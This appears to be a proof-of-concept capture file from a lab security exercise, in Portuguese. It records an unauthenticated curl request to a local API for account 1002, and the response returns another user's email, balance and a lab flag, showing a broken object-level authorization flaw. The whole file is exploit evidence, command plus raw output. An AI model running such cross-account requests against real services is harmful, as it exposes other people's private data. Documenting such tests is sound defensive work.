@@ -1,0 +1,25 @@
+# E2 — E2-02-anon-other-account: PoC — sem credencial na conta 1002
+capturado_em : 2026-11-04T12:59:04.861Z
+duracao_ms   : 0
+expectativa  : 401/403 se autenticação fosse obrigatória; 200 com dados se não.
+
+$ curl -s -i http://127.0.0.1:35021/api/v1/accounts/1002
+
+>>> REQUISICAO
+GET /api/v1/accounts/1002 HTTP/1.1
+Host: 127.0.0.1:35021
+
+<<< RESPOSTA
+HTTP/1.1 200 OK
+connection: keep-alive
+content-type: application/json; charset=utf-8
+date: Wed, 04 Nov 2026 12:59:04 GMT
+keep-alive: timeout=5
+transfer-encoding: chunked
+
+{
+  "accountId": "1002",
+  "owner": "bob@corp.lab",
+  "balanceUsd": 94500,
+  "bolaFlag": "LAB{BOLA_CROSS_ACCOUNT_EXPOSED}"
+}
